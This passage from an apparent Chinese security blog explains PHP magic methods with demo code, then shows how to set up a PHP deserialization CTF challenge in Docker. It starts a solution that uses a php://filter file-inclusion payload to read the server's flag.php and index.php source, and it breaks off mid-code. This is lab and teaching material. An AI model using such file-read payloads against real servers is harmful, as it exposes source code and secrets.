class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">person</span>();</span><br><span class="line"><span class="variable">$person1</span>-&gt;<span class="title function_ invoke__">intro</span>();</span><br><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="variable">$person1</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%90%86%E8%A7%A3/1650958877136-193aefd9-19b0-4418-b7d8-1c1dab0d540d.png" alt="img"></p>
<p>__wakeup()</p>
<p>执行unserialize()前,如果存在__wakeup()方法触发,与__sleep()相对</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;isee&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&quot;女&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">intro</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;1、__intro方法已执行&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;打印结果如下:\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$age:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;age\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;2、__sleep()方法已执行！&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name,$sex已重置为新值.&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&quot;eesi&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age=<span class="string">&quot;女&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$age:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;age\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&quot;isee&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age=<span class="string">&quot;女&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;3、__wakeup()方法已执行！&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name,$sex已重置为默认值.&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$age:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;age\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">person</span>();</span><br><span class="line"><span class="variable">$person1</span>-&gt;<span class="title function_ invoke__">intro</span>();</span><br><span class="line"><span class="variable">$mid</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$person1</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$mid</span>);</span><br></pre></td></tr></table></figure>

<p>分别注释掉__sleeep()方法和__wakeup()方法</p>
<p><img src="/2022/05/05/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%90%86%E8%A7%A3/1650982177789-32d236af-bc3f-4087-86fc-34dcdccf3795.png" alt="img"></p>
<p><img src="/2022/05/05/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%90%86%E8%A7%A3/1650982137084-3ce2f7c5-06ca-4cb5-8ed0-86765216b5c9.png" alt="img"></p>
<p>__invoke()</p>
<p>类被用作以函数的方式调用时，触发</p>
<p>__toString()</p>
<p>类被用作字符串输出时，触发</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;yanyan&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&quot;woman&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">intro</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__intro方法已执行&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;打印结果如下:\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$sex:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;sex\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__invoke()方法已执行！&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name,$sex已重置为新值.&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&quot;xioabai&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex=<span class="string">&quot;man&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$sex:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;sex\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__toString()方法已执行！&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name,$sex已重置为新值.&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&quot;qiaocui&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex=<span class="string">&quot;man&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$sex:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;sex\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;success!!!&#x27;</span>.<span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//常规类方法调用</span></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">person</span>();</span><br><span class="line"><span class="variable">$person1</span>-&gt;<span class="title function_ invoke__">intro</span>();</span><br><span class="line"><span class="comment">//__invoke()触发</span></span><br><span class="line"><span class="variable">$person1</span>();</span><br><span class="line"><span class="comment">//__toString触发</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$person1</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%90%86%E8%A7%A3/1650959416026-21911de9-f19c-4f03-b468-8b74b3759a25.png" alt="img"></p>
<p>__get()</p>
<p>访问私有类中的变量时，触发</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">TKD</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$name</span>=<span class="string">&quot;XY&quot;</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$age</span>=<span class="string">&quot;18&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&#x27;__get()方法已执行！&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&#x27;$age:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;age\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//__get方法触发</span></span><br><span class="line"><span class="variable">$TKD</span>=<span class="keyword">new</span> <span class="title function_ invoke__">TKD</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$TKD</span>-&gt;name;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%90%86%E8%A7%A3/1650960898614-876d4f59-5abb-482f-9019-92a53daaee60.png" alt="img"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-php反序列化题目搭建" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/" class="article-date">
      <time datetime="2022-05-04T16:00:00.000Z" itemprop="datePublished">2022-05-05</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/">php反序列化题目搭建</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="1-安装配置Docker"><a href="#1-安装配置Docker" class="headerlink" title="1.安装配置Docker"></a>1.安装配置Docker</h2><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br></pre></td></tr></table></figure>

<h3 id="1-1-由于自带-yum-没有-Docker-CE-所以我们需要先增加-docker-repo："><a href="#1-1-由于自带-yum-没有-Docker-CE-所以我们需要先增加-docker-repo：" class="headerlink" title="1.1.由于自带 yum 没有 Docker-CE 所以我们需要先增加 docker repo："></a>1.1.由于自带 yum 没有 Docker-CE 所以我们需要先增加 docker repo：</h3><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum-config-manager --add-repo https:<span class="comment">//download.docker.com/linux/centos/docker-ce.repo</span></span><br></pre></td></tr></table></figure>

<h3 id="1-2-用-yum-安装-Docker："><a href="#1-2-用-yum-安装-Docker：" class="headerlink" title="1.2.用 yum 安装 Docker："></a>1.2.用 yum 安装 Docker：</h3><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y docker-ce</span><br></pre></td></tr></table></figure>

<p>报错：<img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651583864901-e5b4af24-eddf-4290-8384-8d825f2e0d5a.png" alt="img"></p>
<p>出现以上错误，根据提示在命令行后加上 <code>--nobest</code>或<code>--allowerasing</code></p>
<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y docker-ce --allowerasing</span><br></pre></td></tr></table></figure>

<h3 id="1-3-直接yum安装，安装成功后查看版本："><a href="#1-3-直接yum安装，安装成功后查看版本：" class="headerlink" title="1.3.直接yum安装，安装成功后查看版本："></a>1.3.直接yum安装，安装成功后查看版本：</h3><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -v</span><br></pre></td></tr></table></figure>

<h3 id="1-4-启动docker："><a href="#1-4-启动docker：" class="headerlink" title="1.4.启动docker："></a>1.4.启动docker：</h3><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>

<h3 id="1-5-设置开机启动："><a href="#1-5-设置开机启动：" class="headerlink" title="1.5.设置开机启动："></a>1.5.设置开机启动：</h3><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig docker <span class="keyword">on</span></span><br></pre></td></tr></table></figure>

<h3 id="1-6配置Docker："><a href="#1-6配置Docker：" class="headerlink" title="1.6配置Docker："></a>1.6配置Docker：</h3><p>因为国内访问 Docker Hub 较慢, 可以使用腾讯云提供的国内镜像源, 加速访问 Docker Hub，依次执行以下命令；</p>
<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;OPTIONS=<span class="string">&#x27;--registry-mirror=https://mirror.ccs.tencentyun.com&#x27;</span>&quot; &gt;&gt; /etc/sysconfig/docker</span><br><span class="line"></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line">service docker restart</span><br></pre></td></tr></table></figure>

<h2 id="2-使用docker搭建ctf题目"><a href="#2-使用docker搭建ctf题目" class="headerlink" title="2.使用docker搭建ctf题目"></a>2.使用docker搭建ctf题目</h2><h3 id="2-1搜索lamp环境的docker镜像"><a href="#2-1搜索lamp环境的docker镜像" class="headerlink" title="2.1搜索lamp环境的docker镜像"></a>2.1搜索lamp环境的docker镜像</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search lamp</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651661174171-2b855952-4f8e-44d4-84a9-282dd7a3ccf7.png" alt="img"></p>
<h3 id="2-2拉取tutum-x2F-lamp镜像"><a href="#2-2拉取tutum-x2F-lamp镜像" class="headerlink" title="2.2拉取tutum&#x2F;lamp镜像"></a>2.2拉取tutum&#x2F;lamp镜像</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull tutum/lamp</span><br></pre></td></tr></table></figure>

<h3 id="2-3拉取完成后，查看本地docker镜像"><a href="#2-3拉取完成后，查看本地docker镜像" class="headerlink" title="2.3拉取完成后，查看本地docker镜像"></a>2.3拉取完成后，查看本地docker镜像</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651686284952-01544360-6e5e-4373-8c4c-623ba2d6b20f.png" alt="img"></p>
<h3 id="2-4新建一个docker容器"><a href="#2-4新建一个docker容器" class="headerlink" title="2.4新建一个docker容器"></a>2.4新建一个docker容器</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p <span class="number">100</span>:<span class="number">80</span> -p <span class="number">3307</span>:<span class="number">3306</span> tutum/lamp</span><br><span class="line"><span class="comment">#-d 容器后台运行。</span></span><br><span class="line"><span class="comment">#-p 指定映射端口。</span></span><br></pre></td></tr></table></figure>

<h3 id="2-5查看系统中运行的docker容器。"><a href="#2-5查看系统中运行的docker容器。" class="headerlink" title="2.5查看系统中运行的docker容器。"></a>2.5查看系统中运行的docker容器。</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651686331118-bdfd517d-af4f-4a5d-af16-4c8da17d0d8a.png" alt="img"></p>
<h3 id="2-6使用浏览器访问访问一下主页，查看映射是否正常"><a href="#2-6使用浏览器访问访问一下主页，查看映射是否正常" class="headerlink" title="2.6使用浏览器访问访问一下主页，查看映射是否正常"></a>2.6使用浏览器访问访问一下主页，查看映射是否正常</h3><p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651662614998-18bad023-7f2f-463b-adc0-9f6ddcd75213.png" alt="img"></p>
<h3 id="2-7将ctf题目源码拷贝到container的主目录中"><a href="#2-7将ctf题目源码拷贝到container的主目录中" class="headerlink" title="2.7将ctf题目源码拷贝到container的主目录中"></a>2.7将ctf题目源码拷贝到container的主目录中</h3><p><strong>windows上传文件夹到linux服务器</strong>：</p>
<p>E:&gt;scp -rp &#x2F;pop username@<em><strong>.</strong></em>.<em><strong>.</strong></em>:&#x2F;web</p>
<p>username@<em><strong>.</strong></em>.<em><strong>.</strong></em>‘s password:</p>
<p>复制windows本地E:&#x2F;pop目录到远程服务器***.<em><strong>.</strong></em>.***的&#x2F;web目录</p>
<p>-r 递归复制子文件夹内容<br>-p 保留原文件修改，访问时间和权限（modes）信息</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651666819761-eedd907b-22f7-4ce7-81f1-2e848f7c0e1f.png" alt="img"></p>
<p>查看：</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651685137661-b1e8b596-caee-4411-855c-0dfa2c1febc0.png" alt="img"></p>
<p>将其复制到容器中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker cp -a /web c642e5bcb088:/<span class="keyword">var</span>/www/html</span><br><span class="line"></span><br><span class="line"><span class="comment">//-a, --archive  Archive mode (copy all uid/gid information)</span></span><br><span class="line"><span class="comment">//归档模式（复制所有UID / GID信息）</span></span><br></pre></td></tr></table></figure>

<h3 id="2-8进入docker-container"><a href="#2-8进入docker-container" class="headerlink" title="2.8进入docker container"></a>2.8进入docker container</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker exec -i -t c642e5bcb088 /bin/bash</span><br><span class="line">  </span><br><span class="line"><span class="comment">#如果从这个容器退出，不会导致容器的停止，推荐使用 docker exec</span></span><br><span class="line"><span class="comment">#-i //让容器的标准输入保持打开。</span></span><br><span class="line"><span class="comment">#-t //让docker分配一个伪终端并绑定到容器的标准输出上。</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651686617235-862358e0-6737-4416-ab5c-c9965e58e37e.png" alt="img"></p>
<h3 id="2-9进入容器中的数据库，创建好ctf题目需要的数据库、数据表等等"><a href="#2-9进入容器中的数据库，创建好ctf题目需要的数据库、数据表等等" class="headerlink" title="2.9进入容器中的数据库，创建好ctf题目需要的数据库、数据表等等"></a>2.9进入容器中的数据库，创建好ctf题目需要的数据库、数据表等等</h3><p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651686657670-3be2b579-c7f1-43fa-ad08-2fb2b5a89dfb.png" alt="img"></p>
<h3 id="2-10安装docker-compose"><a href="#2-10安装docker-compose" class="headerlink" title="2.10安装docker-compose"></a>2.10安装docker-compose</h3><p>运行以下命令以下载 Docker Compose 的当前稳定版本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https:<span class="comment">//get.daocloud.io/docker/compose/releases/download/v2.4.1/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span></span><br></pre></td></tr></table></figure>

<p>将可执行权限应用于二进制文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<p>创建软链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure>

<p>测试是否安装成功：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651686816318-f7be5b4b-9baf-48d3-a78d-8f3711dbc40c.png" alt="img"></p>
<h2 id="3-解题part"><a href="#3-解题part" class="headerlink" title="3.解题part"></a>3.解题part</h2><p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651725794242-b8404a68-edcf-4391-bf80-b4ebb02a7e99.png" alt="img"></p>
<p>打开后显示题目在hint.php,打开发现源码</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651726822105-f0614581-42e1-45f5-8274-d7764a6da664.png" alt="img">发现文件包含，利用协议来读取文件，先来尝试读取flag.php：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">关于伪协议</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p>得到如下结果：</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651726861800-2e6c2bc6-a92c-4fb0-a3c8-776628dc07ff.png" alt="img"></p>
<p>&#x2F;&#x2F;base64解码</p>
  <?php

  I'm not a real flag

  ?>

<p>是个假的flag</p>
<p>读取首页index.php的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>

<p>得到的密文解码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 